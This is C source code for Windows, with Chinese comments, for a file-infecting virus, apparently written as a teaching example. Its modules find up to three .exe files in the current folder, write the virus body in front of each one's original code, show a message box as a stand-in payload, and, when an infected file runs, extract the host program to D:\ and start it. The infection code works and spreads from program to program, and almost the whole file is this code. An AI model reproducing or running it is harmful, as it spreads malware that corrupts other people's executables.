#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Commdlg.h>
/*
	1.条件模块：
	功能：搜索病毒文件所在目录中，规定数目的exe文件
	打开符合条件的文件
*/
HANDLE OpenHostFile(const WIN32_FIND_DATA *pHost, DWORD *nCount)
{
	HANDLE hHost = CreateFile(pHost->cFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		NULL,
		NULL);
	if (hHost != INVALID_HANDLE_VALUE) {
		(*nCount)++;
	}
	else {
		int error = GetLastError();
		printf("查找下一个文件%s时出错:%d\n", pHost->cFileName, error);
	}
	return hHost;
}

//搜索本地函数
DWORD FindHostFile(HANDLE *szHostFileHandle, DWORD dwFindNumber)
{
	DWORD dwResult = 0;
	WIN32_FIND_DATA pNextInfo;
	// 搜索当前目录所有exe文件,从vs启动则是当前工程目录
	HANDLE hFirst = FindFirstFile("*.exe", &pNextInfo);
	if (INVALID_HANDLE_VALUE == hFirst) {
		int error = GetLastError();
		printf("查找首文件%s出错:%d\n", pNextInfo.cFileName, error);
		return dwResult;
	}
	szHostFileHandle[0] = OpenHostFile(&pNextInfo, &dwResult);
	while (dwResult<dwFindNumber)
	{
		DWORD dwTemp = dwResult;
		if (FindNextFile(hFirst, &pNextInfo))
		{
			HANDLE hTemp = OpenHostFile(&pNextInfo, &dwResult);
			if (INVALID_HANDLE_VALUE != hTemp) {
				szHostFileHandle[dwTemp] = hTemp;
			}
		}
		else {
			break;
		}
	}
	return dwResult;
}

/*
	2.感染模块：
	功能：将病毒文件注入宿主文件，将原宿主文件向后移动
	定义病毒大小，使用全局变量是因为其它模块也要用到，44032是代码在VC2005 Debug模式下的生成文件大小,
	但并非都是这样，请自行确定，如果大小错误，那么感染后的文件运行会出错。
*/
DWORD dwVirusSize = 44032;
//感染模块
void Infect(HANDLE hHostFile, HANDLE hLocalFile)
{

	DWORD dwHostSize = GetFileSize(hHostFile, 0);
	DWORD dwReadSize = 0;
	DWORD dwWriteSize = 0;

	char *pLocalTempBuf = (char*)malloc(sizeof(char)*dwVirusSize);
	char *pHostTempBuf = (char*)malloc(sizeof(char)*dwHostSize);
	ReadFile(hLocalFile, pLocalTempBuf, dwVirusSize, &dwReadSize, NULL);
	ReadFile(hHostFile, pHostTempBuf, dwHostSize, &dwReadSize, NULL);

	SetFilePointer(hHostFile, 0, 0, FILE_BEGIN);
	WriteFile(hHostFile, pLocalTempBuf, dwVirusSize, &dwWriteSize, NULL);
	WriteFile(hHostFile, pHostTempBuf, dwHostSize, &dwWriteSize, NULL);

	//清理工作
	SetFilePointer(hLocalFile, 0, 0, FILE_BEGIN);
	free(pLocalTempBuf);
	free(pHostTempBuf);
}

/*
	3.破坏模块：
	功能：仅仅打印提示。
*/
VOID Destory()
{
	MessageBox(NULL, "我保证什么都不做", "Test", MB_OK);
}

/*
	4.宿主程序引导模块
	功能：创建临时文件，将所触发病毒文件的宿主程序写入，然后启动
	这是当被感染的程序执行时才会触发的代码,如果是病毒母体则会在判断大小时直接退出
*/
VOID JumpLocalHostFile(HANDLE hLocalFile)
{
	DWORD nCount = 0;
	DWORD dwLocalFileSize = GetFileSize(hLocalFile, 0);
	// 防止病毒母体程序被感染
	if (dwLocalFileSize == dwVirusSize) {
		return;
	}
	/*
		通过当前被感染的文件大小 - 病毒程序的大小 = 宿主程序原大小
	*/
	char *pTemp = (char*)malloc(sizeof(char)*(dwLocalFileSize - dwVirusSize));
	/*
		将宿主程序读取出来并写入到临时文件中进行启动
	*/
	ReadFile(hLocalFile, pTemp, (dwLocalFileSize - dwVirusSize), &nCount, NULL);

	char szLocalPath[MAX_PATH];
	char szTempPath[MAX_PATH] = "D:\\";
	char szTempName[50];
	GetModuleFileName(NULL, szLocalPath, sizeof(szLocalPath));
	GetFileTitle(szLocalPath, szTempName, 50);
	strcat(szTempPath, szTempName);
	HANDLE hJumpHost = CreateFile(szTempPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, NULL, NULL);
	if (hJumpHost == INVALID_HANDLE_VALUE) {
		int error = GetLastError();
		printf("创建宿主启动文件出错:%d\n", error);
	}
	else
	{
		WriteFile(hJumpHost, pTemp, (dwLocalFileSize - dwVirusSize), &nCount, NULL);
		free(pTemp);
		CloseHandle(hJumpHost);

		PROCESS_INFORMATION information;
		STARTUPINFO si = { sizeof(si) };

		if (CreateProcess(szTempPath, NULL,
			NULL, NULL,
			FALSE, NORMAL_PRIORITY_CLASS,
			NULL, NULL,
			&si, &information))
		{
			WaitForSingleObject(information.hProcess, INFINITE);
		}
		else {
			int error = GetLastError();
			printf("执行宿主程序出错:%d\n", error);
		}
	}
	//DeleteFile(szTempPath);
}

int main()
{
	char szLocalPath[MAX_PATH];
	GetModuleFileName(NULL, szLocalPath, sizeof(szLocalPath));
	HANDLE hLocalFileHandle = CreateFile(szLocalPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		NULL,
		NULL);
	HANDLE szHostHandle[3];
	DWORD dwFoundFileNumber = FindHostFile(szHostHandle, 3);
	Destory();

	for (DWORD i = 0; i<dwFoundFileNumber; i++)
	{
		Infect(szHostHandle[i], hLocalFileHandle);
		CloseHandle(szHostHandle[i]);
	}

	JumpLocalHostFile(hLocalFileHandle);
	CloseHandle(hLocalFileHandle);
	system("pause");
	return 0;
}
